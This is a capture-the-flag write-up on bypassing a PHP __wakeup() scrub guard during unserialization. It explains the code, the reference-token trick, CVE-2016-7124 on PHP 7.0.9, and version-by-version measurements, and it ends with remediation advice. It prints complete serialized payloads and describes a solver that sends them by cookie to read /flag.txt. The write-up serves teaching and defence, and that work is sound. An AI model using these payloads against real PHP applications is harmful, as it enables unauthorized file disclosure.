# 08 — Sleepy Cats Catch No Mice — Writeup

## TL;DR

`DraftMessage::__wakeup()` nulls every property, but it first saves `$subject`
and then writes it back afterwards so support keeps a label for the audit log.
Serialize the payload with `attachments` declared as `R:2;` — a PHP *reference*
to the value table slot holding `subject` — and the two properties become one
zval. The scrub nulls that single zval, and the very next line,
`$this->subject = $label;`, refills it. `attachments` is alive again when
`__destruct()` runs.

On the 7.0.9 service the same object only needs its `O:` header to lie about how
many properties follow (CVE-2016-7124): `__wakeup()` is then never called at all.

Flags:
* modern (8008): `PHRACK{a_reference_slept_through_the_wakeup_call}`
* legacy (9008): `PHRACK{one_extra_property_and_wakeup_never_rang}`

## The bug

### The application

`challenge/src/draft.php` (identical on both containers):

```php
class Attachment {
    public $path;
    public $label = 'attachment';
    public function __toString() {
        return '--8<-- ' . $this->label . "\n"
             . base64_encode((string) @file_get_contents($this->path)) . "\n";
    }
}

class DraftMessage {
    public $subject     = '(no subject)';
    public $body        = '';
    public $attachments = [];

    public function __wakeup() {
        $label = $this->subject;                       // (1) keep the label
        foreach (get_object_vars($this) as $k => $v) { // (2) scrub everything
            $this->$k = null;
        }
        $this->subject = $label;                       // (3) put the label back
        /* ... audit log ... */
    }

    public function __destruct() {                     // the trigger
        if (!is_array($this->attachments) || $this->attachments === []) return;
        $buffer = '';
        foreach ($this->attachments as $item) { $buffer .= (string) $item; }
        @file_put_contents(SPOOL_FILE, $buffer, FILE_APPEND);
    }
}

$draft = @unserialize($blob, ['allowed_classes' => ['DraftMessage', 'Attachment']]);
```

Step (2) is the SugarCRM defence the article quotes. Steps (1) and (3) are the
"business requirement" that kills it.

The POP chain is two hops: `DraftMessage::__destruct()` string-casts each entry
of `$attachments`, which invokes `Attachment::__toString()`, which reads a file
of our choosing and base64-encodes it into the outbox spool, rendered by
`spool.php`.

### Why the naive payload fails

```
O:12:"DraftMessage":3:{s:7:"subject";s:5:"hello";s:4:"body";s:0:"";
                       s:11:"attachments";a:1:{i:0;O:10:"Attachment":2:{...}}}
```

`get_object_vars($this)` inside the class returns a snapshot of all three
properties; the loop assigns `null` to each of them by name. `$attachments`
becomes `null`, `__destruct()` returns immediately. Nothing reaches the spool.

Note that `$this->$k = null` on a property that holds a reference does **not**
detach it: PHP dereferences and writes *through* the reference, so simply
aliasing two properties does not save either of them. The trick is not the
alias — it is the alias plus the write that comes *after* the scrub.

### The reference token

PHP's serializer emits two aliasing tokens:

| token  | meaning                                                                 |
|--------|-------------------------------------------------------------------------|
| `r:n;` | another handle to the same **object** (no PHP reference; assignment to one holder does not affect the other) |
| `R:n;` | a real PHP **reference** (`&`): both slots share one zval               |

`n` indexes the unserializer's value table (`var_hash`). Indices are 1-based and
handed out in parse order as values are created:

```
O:12:"DraftMessage":3:{ s:7:"subject"; a:1:{...}  s:4:"body"; s:0:"";  s:11:"attachments"; R:2; }
^ index 1: the object              ^ index 2: value of the 1st property
                                                          ^ index 3: value of the 2nd property
```

Property *names* do not consume an index; property *values* do. So `R:2;` is
"the value of the first property", i.e. `subject`.

An easy way to confirm the numbering on any PHP build — let PHP emit the token
itself:

```php
php > $a = 'AAAA'; echo serialize([&$a, &$a]);
a:2:{i:0;s:4:"AAAA";i:1;R:2;}

php > class P { public $x; public $y; }
php > $o = new P; $o->x = 'AAAA'; $o->y =& $o->x; echo serialize($o);
O:1:"P":2:{s:1:"x";s:4:"AAAA";s:1:"y";R:2;}
```

That second line is literally the shape of our payload: first property holds the
value, second property is `R:2;`.

### Putting it together

```
O:12:"DraftMessage":3:{
  s:7:"subject";a:1:{i:0;O:10:"Attachment":2:{s:4:"path";s:9:"/flag.txt";s:5:"label";s:5:"m-ref";}}
  s:4:"body";s:0:"";
  s:11:"attachments";R:2;
}
```

Execution inside `__wakeup()`:

| line                                  | effect                                                       |
|---------------------------------------|--------------------------------------------------------------|
| `$label = $this->subject;`            | reads *through* the reference, copies the `Attachment` array  |
| `$this->subject = null;`              | writes null into the shared zval — `attachments` dies too     |
| `$this->body = null;`                 | —                                                             |
| `$this->attachments = null;`          | writes null into the same shared zval again — still null      |
| `$this->subject = $label;`            | writes the array back into the shared zval → **`attachments` is the array again** |

`__destruct()` then walks the array and dumps `/flag.txt` into the spool.

This is the mechanism inhann describes for the Laravel/`symfony/mime` chains
(there the restoring write lives in a *second* class' `__wakeup()`, reached via
`ReflectionProperty::setValue()`); here the guard restores its own label, which
is enough. Paul Axe's WCTF 2019 "P Door" is the original public use of `R:` for
this purpose.

## The legacy service: CVE-2016-7124

One byte:

```
O:12:"DraftMessage":4:{ ...only three properties follow... }
                    ^
```

In PHP's `ext/standard/var_unserializer.re`, `object_common2()` reads the
declared element count, allocates the object, and then calls
`process_nested_data()` to fill it. If the input runs out before `elements`
pairs have been read, that helper returns failure and `object_common2()` takes
an early `return 0` — **before** reaching the block that looks up and calls
`__wakeup()`. The object is nevertheless fully constructed, already populated
with the three properties that *were* parsed, and already registered in the
unserializer's value list, which means it will be destroyed (and its
`__destruct()` run) when that list is torn down.

`unserialize()` returns `false`, the application ignores the result — and the
destructor fires anyway with every property intact.

Fixed in **PHP 5.6.25 / 7.0.10** by calling `__wakeup()` (and marking the object)
regardless of the parse outcome. The lab's legacy image is `php:7.0.9-apache`,
i.e. the last release before the fix.

Measured on the two services with the identical payload:

```
[=] 7.0.9 honest count : scrubbed   (expected: scrubbed)
[=] 7.0.9 inflated     : leaked     (expected: leaked)
[=] 8.2   honest count : scrubbed   (expected: scrubbed)
[=] 8.2   inflated     : scrubbed   (expected: scrubbed)
RESULT: as documented
```

(`make solve-legacy`, or `solve/solve_legacy.py`.)

On 8.2 the inflated count makes `unserialize()` return `false` *and* prevents the
destructor from running at all — the object is torn down as a failed
construction. The reference trick is the only way in.

## The third bypass: "fast destruct" — measured, not folklore

The folklore says: put the object in an array under a key that is then
overwritten (`a:2:{i:0;<object>i:0;i:1;}`), the object's refcount drops to zero
while `unserialize()` is still running, its destructor fires early, and it
therefore beats the "delayed" `__wakeup()`.

Here is what actually happens. Test class prints `<wakeup>` and then
`[destruct]` with the property values it can still see:

| PHP     | `a:2:{i:0;<obj>i:0;i:1;}`                     | conclusion                       |
|---------|----------------------------------------------|----------------------------------|
| 5.6.24  | `<wakeup>` then `[destruct] a='AAAA' b=NULL` | `__wakeup()` ran first           |
| 7.0.9   | `<wakeup>` then `[destruct] a='AAAA' b=NULL` | `__wakeup()` ran first           |
| 7.4.33  | `<wakeup>` then `[destruct] a='AAAA' b=NULL` | `__wakeup()` ran first           |
| 8.2.33  | `<wakeup>` then `[destruct] a='AAAA' b=NULL` | `__wakeup()` ran first           |

**On every version tested, the duplicate key does not bypass `__wakeup()`.** The
unserializer's own value table holds a reference to the object for the whole
parse, so overwriting the array slot never drops the last reference. The same is
true for a deliberately truncated payload (`a:2:{i:0;<obj>i:1;`): `__wakeup()`
still runs, and the destructor then sees scrubbed properties. `solve/solve.py`
stage 3 exercises this over HTTP against the live service and asserts it does
*not* produce the flag.

Two related behaviours *are* real, and both were measured here:

**1. `__wakeup()` became deferred in 7.1.** Payload
`a:2:{i:0;<W: __wakeup throws>i:1;<D: has __destruct>}`:

| PHP     | observed                                    | meaning                                     |
|---------|---------------------------------------------|---------------------------------------------|
| 5.6.24  | `<W::wakeup>` `[W::destruct]`, D never built | `__wakeup()` runs inline, the throw aborts the parse |
| 7.0.9   | `<W::wakeup>` `[W::destruct]`, D never built | same                                        |
| 7.1.32  | `<W::wakeup>` `[D::destruct]`                | D was fully parsed *before* W's `__wakeup()` ran |
| 7.2.23  | `<W::wakeup>` `[D::destruct]`                | same                                        |
| 7.4.33  | `<W::wakeup>` `[D::destruct]`                | same                                        |
| 8.2.33  | `<W::wakeup>` `[D::destruct]`                | same                                        |

That deferral is what makes the article's description ("trigger garbage
collection before one object's *delayed* `__wakeup()`") apply to 7.1+, and it is
also what lets inhann's variant work: a second object's `__wakeup()` can run
*after* the guard's and refill a shared reference.

**2. A throwing `__wakeup()` kills its own destructor on 7.1+.** Same class,
`__wakeup()` throws, `__destruct()` prints:

| PHP     | destructor after the throw |
|---------|----------------------------|
| 5.6.24  | runs                       |
| 7.0.9   | runs                       |
| 7.1.32  | **suppressed**             |
| 7.4.33  | **suppressed**             |
| 8.2.33  | **suppressed**             |

This is why the lab's modern guard scrubs but does not `throw`, unlike the
SugarCRM snippet in the article. On PHP ≥ 7.1 a guard that throws destroys the
attacker's own `__destruct()` trigger as a side effect, so a chain against such
a guard has to end in a *different* object's destructor (reachable only if the
`allowed_classes` list is wider than this lab's). That is a genuine, measurable
hardening that the 2016-era write-ups predate — worth knowing before you spend
an evening on a payload that cannot work.

## The exploit

`solve/` is Python 3 standard library only:

* `payloads.py` — every serialized blob, assembled from raw bytes:
  `payload_naive()`, `payload_reference()` (`R:2;`),
  `payload_cve_2016_7124()` (declared count 4, three properties),
  `payload_fast_destruct()` (duplicate array key), and `as_cookie()`
  (base64 + percent-encoding, because PHP url-decodes cookie values and a bare
  `+` inside base64 would be eaten).
* `client.py` — ships one blob in the `draft` cookie, then scrapes
  `/spool.php` for the base64 blob logged under a given `Attachment::$label`.
  The spool is append-only, so `deliver()` first records how long it already
  is and `flag_for()` only ever scans the tail that the delivery it follows
  appended. Together with the per-run nonce that `payloads.label()` glues onto
  every label, that is what keeps the five stages honest on a warm container:
  no stage can be credited with an entry written by an earlier request, and a
  stage-4 regression cannot be masked by a previous successful run.
* `solve.py` — five stages: naive / CVE / fast-destruct on the modern service
  must all **fail**, the reference trick must **succeed**, and CVE-2016-7124 on
  the legacy service must **succeed**. Any control payload that succeeds is
  treated as an error.
* `solve_legacy.py` — the standalone one-byte demo across both services.

The bytes that matter, verbatim:

```
O:12:"DraftMessage":3:{s:7:"subject";a:1:{i:0;O:10:"Attachment":2:{s:4:"path";s:9:"/flag.txt";s:5:"label";s:5:"m-ref";}}s:4:"body";s:0:"";s:11:"attachments";R:2;}
O:12:"DraftMessage":4:{s:7:"subject";s:5:"hello";s:4:"body";s:0:"";s:11:"attachments";a:1:{i:0;O:10:"Attachment":2:{s:4:"path";s:9:"/flag.txt";s:5:"label";s:5:"l-cve";}}}
```

(`solve.py` actually sends `m-ref-<nonce>` / `l-cve-<nonce>`, with one random
nonce per run, so the `s:5:` string lengths grow accordingly. Nothing about the
technique changes — the label is just an `Attachment` property — but it is what
makes a re-run of the solver against a container that already holds a spool
from a previous run mean anything.)

## Fixing it

* **Do not unserialize attacker-controlled data.** A draft that lives in the
  client belongs in JSON with an HMAC, or server-side behind an opaque id.
  `allowed_classes` shrinks the gadget pool; it does not close the hole.
* If a class must be deserialization-hostile, make it *impossible to
  deserialize*, not "deserialized then cleaned":

  ```php
  public function __unserialize(array $data): void {
      throw new LogicException('DraftMessage is not deserializable');
  }
  ```

  `__unserialize()` (PHP 7.4+) replaces the property-population step entirely:
  the unserializer never writes to the object, so there is nothing to scrub and
  nothing to alias. Verified against this lab's reference payload on 8.2.33 —
  `unserialize()` returns `false` and the destructor never sees an attachment.
* Never re-populate a property after a scrub. If `__wakeup()` must keep a label,
  copy it into a *fresh* scalar (`$this->subject = (string) $label;` is still
  wrong if `$label` came from the payload — cast and validate, and assign to a
  property that was never part of the incoming object).
* Keep the dangerous side effect out of `__destruct()`. A destructor that writes
  files is a gadget by construction; flush the spool from an explicit `send()`.
* Run a supported PHP. CVE-2016-7124 was fixed in 5.6.25 / 7.0.10 (2016).

## Going further

* Rebuild the guard with the article's exact SugarCRM body (scrub **and**
  `throw`), widen `allowed_classes`, and land the chain in a second class'
  destructor — the ordering measured above tells you it has to work that way on
  7.1+.
* Reproduce inhann's original: put the restoring write in a *different* class'
  `__wakeup()` (e.g. one that re-assigns a property through Reflection) and let
  the deferred wakeup ordering do the work.
* PHPGGC (<https://github.com/ambionics/phpggc>) ships real chains for Laravel,
  Symfony, Monolog and friends; several of them carry `R:` tokens for exactly
  this reason.
* The `C:` (Serializable) format is a third path: for a class implementing
  `Serializable`, PHP calls the class' own `unserialize()` method and
  `__wakeup()` is never involved at all.

## References

* Orange Tsai, *"The Art of PHP - My CTF Journey and Untold Stories!"*, Phrack
  #72, section 2.2 — "Sleepy Cats Catch No Mice".
* Taoguang "Ryat" Chen, PHP bug #72663 (CVE-2016-7124) —
  <https://bugs.php.net/bug.php?id=72663>
* Paul Axe, *WCTF 2019 / P Door* —
  <https://github.com/paul-axe/ctf/blob/master/wctf2019/p-door/p-door.pdf>
* inhann, *A new way to bypass `__wakeup()` and build POP chain* —
  <https://inhann.top/2022/05/17/bypass_wakeup/>
* PHP source, `ext/standard/var_unserializer.re` — `object_common2()`,
  `process_nested_data()` and the `R:` / `r:` handlers.
* PHP manual, `__serialize()` / `__unserialize()` —
  <https://www.php.net/manual/en/language.oop5.magic.php>
